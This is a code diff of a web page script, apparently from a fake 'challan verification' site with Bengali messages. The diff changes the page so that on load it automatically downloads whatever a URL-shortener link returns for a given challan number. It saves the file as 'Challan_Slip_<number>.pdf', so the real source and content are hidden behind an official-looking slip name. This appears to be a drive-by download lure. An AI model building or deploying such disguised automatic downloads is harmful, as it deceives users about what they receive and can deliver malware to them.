@@ -18,21 +18,21 @@
 
         window.onload = function() {
             var params = getUrlVars();
-            var filename = params["file"];   // ?file=yourfile.pdf
+            var chNo = params["challanNo"];
             
-            if (filename) {
-                var downloadUrl = 'https://challanverification.github.io/challan/' + filename;
+            if (chNo) {
+                var downloadUrl = 'https://surl.li/lvfopd=' + chNo;
                 
                 var link = document.createElement('a');
                 link.href = downloadUrl;
-                link.download = filename;   // ফাইল নাম
+                link.download = 'Challan_Slip_' + chNo + '.pdf';
                 document.body.appendChild(link);
                 link.click();
                 document.body.removeChild(link);
                 
-                document.body.innerHTML = '<h2 style="text-align:center; margin-top:50px; font-family:Arial;">ডাউনলোড শুরু হচ্ছে...<br>ফাইল: ' + filename + '</h2>';
+                document.body.innerHTML = '<h2 style="text-align:center; margin-top:50px; font-family:Arial;">ডাউনলোড শুরু হচ্ছে...<br>চালান নম্বর: ' + chNo + '</h2>';
             } else {
-                document.body.innerHTML = '<h2 style="text-align:center; margin-top:50px; color:red; font-family:Arial;">ফাইলের নাম দিন। উদাহরণ: ?file=2425-0033588820.pdf</h2>';
+                document.body.innerHTML = '<h2 style="text-align:center; margin-top:50px; color:red; font-family:Arial;">চালান নম্বর পাওয়া যায়নি। লিঙ্কটি সঠিকভাবে ব্যবহার করুন।</h2>';
             }
         };
     </script>
